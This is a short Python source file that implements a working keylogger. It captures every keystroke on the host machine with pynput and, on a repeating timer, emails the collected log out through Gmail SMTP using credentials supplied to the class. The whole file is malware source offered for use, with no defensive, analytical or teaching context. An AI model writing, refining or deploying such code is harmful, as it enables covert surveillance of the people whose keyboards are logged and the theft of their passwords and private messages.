#!/usr/bin/env python

import smtplib

import threading

import pynput

# Create Keylogger Class
from pynput import keyboard


class KeyLogger:

    # Define __init__ variables

    def __init__(self, time_interval: int, email: str, password: str) -> None:
        """

        :rtype: object
        """
        self.interval = time_interval
        self.log = "KeyLogger has started..."
        self.email = email
        self.password = password

    # Create Log which all keystrokes will be appended to

    def append_to_log(self, string):
        assert isinstance(string, str)
        self.log = self.log + string

    # Create Keylogger

    def on_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.esc:
                print("Exiting program...")
                return False
            else:
                current_key = " " + str(key) + " "

        self.append_to_log(current_key)


    # Create underlying back structure which will publish emails

    def send_mail(self, email, password, message):
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    # Create Report & Send Email

    def report_n_send(self) -> str:
        send_off = self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        timer = threading.Timer(self.interval, self.report_n_send)
        timer.start()

    # Start KeyLogger and Send Off Emails

    def start(self) -> str:
        """

        :rtype: object
        """
        keyboard_listener = keyboard.Listener(on_press = self.on_press)
        with keyboard_listener:
            self.report_n_send()
            keyboard_listener.join()
